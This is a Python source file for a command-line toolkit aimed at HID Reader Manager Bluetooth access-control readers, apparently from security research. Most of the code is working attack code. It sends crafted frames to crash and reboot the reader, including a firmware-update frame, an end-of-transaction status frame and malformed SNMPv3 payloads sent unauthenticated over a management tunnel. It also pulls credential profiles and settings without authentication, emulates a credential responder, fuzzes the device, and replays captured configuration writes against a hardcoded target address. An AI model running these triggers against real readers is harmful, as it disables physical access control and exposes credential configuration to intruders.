"""hid_rm toolkit -- one cohesive CLI for everything we have researched about the
HID Reader Manager reader (PROTOCOL.md).

Groups:
  DISCOVERY   scan | probe | leak | enumerate | emulate
  INSPECT     show | list | decode | decode-snmp | settings | tech |
              parse-snoop | fuzz-list
  DRIVE       core | locate | send | snmp-discover | fuzz
  CRASH       crash e2 | crash e1 [status] | crash tunnel [case]
  REBOOT      reboot | watch
  CONFIG      config-get | config-set | config-probe | config-apply

Every command that talks to the reader accepts an optional MAC
(default: C0:60:33:15:2B:31). Add --verbose (-v) for raw protocol detail.

Examples:
  python -m hid_rm.toolkit scan
  python -m hid_rm.toolkit leak
  python -m hid_rm.toolkit crash e2
  python -m hid_rm.toolkit crash tunnel badber
  python -m hid_rm.toolkit reboot
  python -m hid_rm.toolkit locate --seconds 5
"""
import argparse
import asyncio
import json
import sys
import time

from . import (
    DATA_CHAR_UUID,
    artemis,
    config_oids,
    fuzz,
    framing,
    seos,
    snmpv3,
    tunnel,
)
from . import cli as _cli

MAC_DEFAULT = "C0:60:33:15:2B:31"

# Management-tunnel engagement constants (PROTOCOL.md §37).
OPSEL = bytes.fromhex("a000000382002f000101")
FCI_OK = bytes.fromhex("6f0885060201400201009000")
SW_OK = bytes.fromhex("9000")
SW_NOT_FOUND = bytes.fromhex("6a82")

TUNNEL_CASES = {
    "badber":  bytes([0x00, 0xCA, 0x00, 0x00]) + bytes([0x30, 0xFF]) + bytes(10),
    "hugeoid": tunnel.build_partial_read_get(bytes(200), offset=0, length=128),
    "puthuge": bytes([0x00, 0xDB, 0x00, 0x00]) + bytes(120),
    "recur":   bytes([0x00, 0xCA, 0x00, 0x00]) + bytes([0x30, 0x10] * 8),
}


# ---------------------------------------------------------------- helpers ---

async def present(mac: str, timeout: float = 2.5) -> bool:
    from bleak import BleakScanner
    return mac in await BleakScanner.discover(timeout=timeout)


async def wait_up(mac: str, tries: int = 120, pause: float = 3.0) -> bool:
    """The reader has a natural dark/up cycle (PROTOCOL.md §36) -- poll until
    it is advertising again before we start."""
    for i in range(tries):
        if await present(mac):
            return True
        if i % 10 == 0:
            print("  (reader dark, waiting for its up-window ...) ...", flush=True)
        await asyncio.sleep(pause)
    return False


async def watch_restart(mac: str, duration: int = 90) -> str:
    """Poll advertising after a crash; a dark gap of ~50-90s followed by a
    return is the reboot signature (vs the natural dark cycle, which is longer)."""
    print(f"\n  [watch] advertising state for up to {duration}s "
          f"(reboot = a dark gap of ~50-90s):", flush=True)
    t0 = time.monotonic()
    first_dark = None
    while time.monotonic() - t0 < duration:
        if await present(mac):
            if first_dark is not None:
                return (f"REBOOT (dark {time.monotonic() - first_dark:.0f}s) "
                        f"-- reproduced; reader back and advertising")
            return "STABLE (never went dark this run)"
        if first_dark is None and time.monotonic() - t0 >= 3:
            first_dark = time.monotonic()
        await asyncio.sleep(1)
    return "STILL DARK at end of window (reboot, or the reader's natural dark cycle)"


async def _send_and_reply(mac: str, frame: bytes, label: str):
    """Connect, drain spontaneous frames, send one raw BLE frame, show the
    reply, disconnect. Shared by the extension-frame crash triggers."""
    from bleak import BleakClient
    c = BleakClient(mac)
    rx = []
    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, lambda _, d: rx.append(bytes(d)))
    await asyncio.sleep(1.5)
    rx.clear()
    print(f"   [send] {label} -> {frame.hex()}", flush=True)
    await c.write_gatt_char(DATA_CHAR_UUID, frame, response=False)
    await asyncio.sleep(2.0)
    for f in rx:
        print(f"   [reply] {f.hex()}  {seos.describe(f)}", flush=True)
    if not rx:
        print("   [reply] (none -- link may have dropped)", flush=True)
    try:
        await c.disconnect()
    except Exception as e:
        print(f"   [disconnect] {type(e).__name__}: {e}", flush=True)


# ------------------------------------------------------------- crash cmds ---

async def crash_e2(mac: str, duration: int = 90) -> str:
    """0xE2 FW_UPDATE crash (PROTOCOL.md §35): the 3-byte frame `E2 84 00`
    (EXT_FW_UPDATE carrying REQUEST_INIT_FLASH) -> reader replies
    `E1 0A` (EOT CONFIG_FORBIDDEN), then reboots."""
    frame = seos.ext_frame(2, seos.REQUEST_INIT_FLASH)
    print(f"== crash e2: 0xE2 FW_UPDATE -> {mac} ==")
    if not await wait_up(mac):
        return "no-reader"
    await _send_and_reply(mac, frame, "E2 84 00 (INIT_FLASH)")
    return await watch_restart(mac, duration)


async def crash_e1(mac: str, status: int = 1, duration: int = 90) -> str:
    """0xE1 EOT-status crash (PROTOCOL.md §36): `E1 <status>` -> link drop +
    reboot. status 1=SUCCESS 2=SAM_REJECTED ... (seos.EOT_STATUS)."""
    frame = bytes([seos.EXT_END_OF_TRANSACTION, status & 0xFF])
    name = seos.EOT_STATUS.get(status & 0xFF, hex(status & 0xFF))
    print(f"== crash e1: 0xE1 EOT status={status} ({name}) -> {mac} ==")
    if not await wait_up(mac):
        return "no-reader"
    await _send_and_reply(mac, frame, f"E1 {status:02X} ({name})")
    return await watch_restart(mac, duration)


async def crash_tunnel(mac: str, case: str = "badber", duration: int = 90) -> str:
    """Management-tunnel (SNMPv3) crash (PROTOCOL.md §37): engage the tunnel
    unauthenticated (FCI_OK on the OPERATION_SELECTOR AID), then on the
    reader's GET_DATA poll inject a malformed SNMPv3 command -> reader
    re-offers the tunnel, drops the link, and reboots."""
    payload = TUNNEL_CASES.get(case, TUNNEL_CASES["badber"])
    print(f"== crash tunnel: case={case} ({len(payload)} B) -> {mac} ==")
    if not await wait_up(mac):
        return "no-reader"
    from bleak import BleakClient
    c = BleakClient(mac)
    rx = []
    ev = asyncio.Event()

    def on_n(_, d):
        rx.append(bytes(d))
        ev.set()

    async def drain(t=2.0):
        try:
            await asyncio.wait_for(ev.wait(), timeout=t)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(0.05)
        f = list(rx)
        rx.clear()
        ev.clear()
        return f

    async def send(body: bytes):
        for fr in framing.ble_fragment(body):
            await c.write_gatt_char(DATA_CHAR_UUID, fr, response=False)
            await asyncio.sleep(0.02)

    await c.connect()
    await c.start_notify(DATA_CHAR_UUID, on_n)
    injected = False
    for _ in range(30):
        frags = await drain(2.0)
        if not c.is_connected:
            print("   [link down]", flush=True)
            break
        if not frags:
            continue
        body = framing.ble_reassemble(frags)
        if not body:
            continue
        ins = body[1] if len(body) > 1 else None
        if ins == 0xA4:  # SELECT
            aid = body[5:5 + body[4]] if len(body) >= 5 else b""
            print(f"   < SELECT {aid.hex()}", flush=True)
            await send(FCI_OK if aid == OPSEL else SW_NOT_FOUND)
            continue
        if ins == 0xCA and not injected:  # GET_DATA poll -> inject
            print(f"   < GET_DATA poll; injecting {case} ({len(payload)} B)", flush=True)
            await send(payload)
            injected = True
            continue
        if ins == 0xDA:  # PUT_DATA (session setup / reply)
            print("   < PUT_DATA (reply)", flush=True)
            await send(SW_OK)
            continue
        print(f"   < {frags[0].hex()}", flush=True)
    try:
        await c.disconnect()
    except Exception as e:
        print(f"   [disconnect] {type(e).__name__}: {e}", flush=True)
    if not injected:
        print("   (tunnel never reached the GET_DATA poll -- reader may have "
              "changed behaviour; try again)", flush=True)
    return await watch_restart(mac, duration)


async def cmd_reboot(mac: str, duration: int = 90) -> str:
    """Reboot the reader via the most reliable confirmed trigger (0xE2, §35)
    and watch it come back -- this is the 'start-up mode' window."""
    return await crash_e2(mac, duration)


async def cmd_watch(mac: str, duration: int = 120) -> str:
    """Passively observe the reader's advertising state (its natural dark/up
    cycle, §36) without sending anything."""
    print(f"== watch: advertising state of {mac} for up to {duration}s ==")
    t0 = time.monotonic()
    while time.monotonic() - t0 < duration:
        p = await present(mac)
        print(f"   t+{int(time.monotonic() - t0):3d}s: {'PRESENT' if p else 'DARK'}", flush=True)
        await asyncio.sleep(5)
    return "watch complete"


# ------------------------------------------------------------- argparse ----

def _add_mac(p):
    p.add_argument("mac", nargs="?", default=MAC_DEFAULT,
                   help=f"reader BLE MAC (default {MAC_DEFAULT})")


def build_parser():
    ap = argparse.ArgumentParser(
        prog="hid_rm.toolkit",
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="raw protocol detail (hex frames, transcripts)")
    sub = ap.add_subparsers(dest="cmd")

    # DISCOVERY
    p = sub.add_parser("scan", help="scan for nearby readers")
    p.add_argument("--timeout", type=float, default=8.0)
    _cli_add(sub, "probe", "connect and try pre-auth safe reads (all blocked on our reader, §9)",
             fn=lambda a, v: _cli.cmd_probe(a.mac, verbose=v), add_mac=True)
    _cli_add(sub, "leak", "unauthenticated config leak: credential profiles + settings",
             fn=lambda a, v: _cli.cmd_leak(a.mac, cooldown=a.cooldown,
                                          out_prefix=getattr(a, "out", None), verbose=v),
             add_mac=True, extra=[("cooldown", 0.0), ("out", None)])
    _cli_add(sub, "enumerate", "full recon pass in one session (GATT, leak, discovery)",
             fn=lambda a, v: _cli.cmd_enumerate(a.mac, cooldown=a.cooldown,
                                                out_prefix=getattr(a, "out", None), verbose=v),
             add_mac=True, extra=[("cooldown", 0.0), ("out", None)])
    _cli_add(sub, "emulate", "act as the credential responder; log the reader's discovery sequence",
             fn=lambda a, v: _cli.cmd_emulate(a.mac, cooldown=a.cooldown, verbose=v),
             add_mac=True, extra=[("cooldown", 0.0)])

    # INSPECT (offline)
    p = sub.add_parser("show", help="offline payload preview: show core|locate|snmp-discovery")
    p.add_argument("kind", choices=["core", "locate", "snmp-discovery"])
    p.add_argument("rest", nargs="*", help="core <name> | locate [seconds] [color]")
    _cli_add(sub, "list", "list Artemis core commands (! = state-changing)",
             fn=lambda a, v: [print(("! " if artemis.is_dangerous(n) else "  ") + n)
                             for n in artemis.CORE], add_mac=False)
    p = sub.add_parser("decode", help="decode an Artemis core response payload (hex)")
    p.add_argument("hex")
    p = sub.add_parser("decode-snmp", help="parse an SNMP Report PDU (hex)")
    p.add_argument("hex")
    p = sub.add_parser("settings", help="list reader config settings (name <-> OID catalog)")
    p.add_argument("category", nargs="?", default=None)
    p = sub.add_parser("tech", help="credential technologies from a leak report JSON")
    p.add_argument("json_file")
    p = sub.add_parser("parse-snoop", help="decode a phone<->reader HCI btsnoop capture")
    p.add_argument("file")
    p.add_argument("authkey", nargs="?", default=None, help="SNMP auth key hex")
    p.add_argument("privkey", nargs="?", default=None, help="SNMP priv key hex")
    _cli_add(sub, "fuzz-list", "list robustness test cases",
             fn=lambda a, v: [print(f"{n:32} {sum(len(f) for f in fr):4}B  {note}")
                             for n, fr, note in fuzz.cases()], add_mac=False)

    # DRIVE
    _cli_add(sub, "core", "send an Artemis core read and decode the reply",
             fn=lambda a, v: _cli.cmd_core(a.mac, a.name, verbose=v), add_mac=True,
             extra=[("name", None, True)])
    _cli_add(sub, "locate", "'find reader': flash the LED + beep (unauthenticated)",
             fn=lambda a, v: _cli.cmd_locate(a.mac, seconds=a.seconds, color=a.color,
                                            beep=not a.no_beep, verbose=v),
             add_mac=True, extra=[("seconds", 3.0), ("color", "blue"), ("no_beep", False)])
    _cli_add(sub, "send", "send a raw APDU (hex) framed over the data channel",
             fn=lambda a, v: _cli.cmd_send(a.mac, a.hexstr, verbose=v), add_mac=True,
             extra=[("hexstr", None, True)])
    _cli_add(sub, "snmp-discover", "send SNMPv3 discovery, show engine params",
             fn=lambda a, v: _cli.cmd_send(a.mac,
                                          framing.build_apdu(
                                              framing.INS_GET_DATA,
                                              snmpv3.build_discovery()).hex(),
                                          verbose=v), add_mac=True)
    _cli_add(sub, "fuzz", "robustness sweep: one case per fresh connection, watch for crash",
             fn=lambda a, v: _cli.cmd_fuzz(a.mac, a.name, verbose=v), add_mac=True,
             extra=[("name", None)])

    # CRASH / REBOOT
    pc = sub.add_parser("crash", help="fire a confirmed crash surface, then watch the reboot")
    pc.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    pc.add_argument("surface", choices=["e2", "e1", "tunnel"])
    pc.add_argument("param", nargs="?", default=None,
                    help="e1: status (1..10); tunnel: case badber|hugeoid|puthuge|recur")
    pc.add_argument("--duration", type=int, default=90, help="reboot-watch window (s)")
    pr = sub.add_parser("reboot", help="reboot the reader (0xE2 trigger, §35) and watch it come back")
    pr.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    pr.add_argument("--duration", type=int, default=90)
    pw = sub.add_parser("watch", help="passively observe the reader's dark/up cycle (§36)")
    pw.add_argument("mac", nargs="?", default=MAC_DEFAULT)
    pw.add_argument("--duration", type=int, default=120)

    # CONFIG
    _cli_add(sub, "config-get", "authenticated config read (SNMPv3 GET with Origo keys)",
             fn=lambda a, v: _cli.cmd_config_get(a.mac, a.oid, a.authkey, a.privkey,
                                                 a.user, verbose=v),
             add_mac=True, extra=[("oid", None, True), ("authkey", None, True),
                                 ("privkey", None, True), ("user", None, True)])
    _cli_add(sub, "config-set", "authenticated config WRITE (DANGER: state-changing)",
             fn=lambda a, v: _cli.cmd_config_set(a.mac, a.oid, a.value, a.authkey,
                                                 a.privkey, a.user, verbose=v),
             add_mac=True, extra=[("oid", None, True), ("value", None, True),
                                 ("authkey", None, True), ("privkey", None, True),
                                 ("user", None, True)])
    _cli_add(sub, "config-probe", "keyless (noAuthNoPriv) read test: what's readable without keys",
             fn=lambda a, v: _cli.cmd_config_probe(a.mac, a.oid, verbose=v), add_mac=True,
             extra=[("oid", None, True)])
    _cli_add(sub, "config-apply", "replay a captured cloud/config-card SNMP package",
             fn=lambda a, v: _cli.cmd_config_apply(a.mac, a.msgfile, write=(not a.read),
                                                   verbose=v),
             add_mac=True, extra=[("msgfile", None, True), ("read", False)])
    return ap


TOOLKIT_FNS = {}


def _cli_add(sub, name, help_text, fn, add_mac=False, extra=()):
    """Register a subcommand that delegates to an existing cli.py function.
    `extra` entries are (name, default, required) positional args."""
    p = sub.add_parser(name, help=help_text)
    if add_mac:
        _add_mac(p)
    for spec in extra:
        opt = spec[0]
        default = spec[1]
        required = spec[2] if len(spec) > 2 else False
        if opt in ("cooldown", "seconds"):
            p.add_argument("--" + opt, type=float, default=default, dest=opt)
        elif opt == "no_beep":
            p.add_argument("--no-beep", action="store_true", dest="no_beep", default=False)
        elif opt == "read":
            p.add_argument("--read", action="store_true", dest="read",
                           help="replay as GET_DATA (read) instead of PUT_DATA (write)")
        elif required:
            p.add_argument(opt, default=default)
        else:
            p.add_argument(opt, nargs="?", default=default)
    TOOLKIT_FNS[name] = fn
    return p


def _scan(args, verbose):
    from bleak import BleakScanner

    async def s():
        for d in await BleakScanner.discover(timeout=args.timeout):
            tag = "  <-- target" if d.address == MAC_DEFAULT else ""
            print(f"  {d.address}  {d.name}{tag}")

    asyncio.run(s())


def _offline(args, verbose):
    if args.cmd == "show":
        rest = [args.kind] + (args.rest or [])
        _cli.cmd_show(rest)
    elif args.cmd == "list":
        for n in artemis.CORE:
            print(("! " if artemis.is_dangerous(n) else "  ") + n)
    elif args.cmd == "decode":
        print(artemis.decode_response(bytes.fromhex(args.hex.replace(" ", ""))))
    elif args.cmd == "decode-snmp":
        for k, v in snmpv3.parse_report(bytes.fromhex(args.hex.replace(" ", ""))).items():
            print(f"  {k}: {v}")
    elif args.cmd == "settings":
        print(config_oids.render_catalog(args.category))
    elif args.cmd == "tech":
        from . import technology
        print(technology.render(json.load(open(args.json_file)), verbose=verbose))
    elif args.cmd == "parse-snoop":
        from . import btsnoop
        ak = bytes.fromhex(args.authkey) if getattr(args, "authkey", None) else None
        pk = bytes.fromhex(args.privkey) if getattr(args, "privkey", None) else None
        print(btsnoop.render(btsnoop.decode_session(open(args.file, "rb").read(),
                                                    auth_key=ak, priv_key=pk)))
    elif args.cmd == "fuzz-list":
        for n, fr, note in fuzz.cases():
            print(f"{n:32} {sum(len(f) for f in fr):4}B  {note}")


def main(argv):
    ap = build_parser()
    args = ap.parse_args(argv)
    if not args.cmd:
        ap.print_help()
        return
    if args.cmd == "scan":
        _scan(args, args.verbose)
        return
    if args.cmd in ("show", "list", "decode", "decode-snmp", "settings",
                    "tech", "parse-snoop", "fuzz-list"):
        _offline(args, args.verbose)
        return

    if args.cmd == "crash":
        if args.surface == "e2":
            print(asyncio.run(crash_e2(args.mac, args.duration)))
        elif args.surface == "e1":
            status = int(args.param, 0) if args.param else 1
            print(asyncio.run(crash_e1(args.mac, status, args.duration)))
        else:
            case = args.param or "badber"
            if case not in TUNNEL_CASES:
                print(f"unknown tunnel case {case!r}; choose from {list(TUNNEL_CASES)}")
                return
            print(asyncio.run(crash_tunnel(args.mac, case, args.duration)))
        return
    if args.cmd == "reboot":
        print(asyncio.run(cmd_reboot(args.mac, args.duration)))
        return
    if args.cmd == "watch":
        print(asyncio.run(cmd_watch(args.mac, args.duration)))
        return

    print(TOOLKIT_FNS[args.cmd](args, args.verbose))


if __name__ == "__main__":
    main(argv=sys.argv[1:])
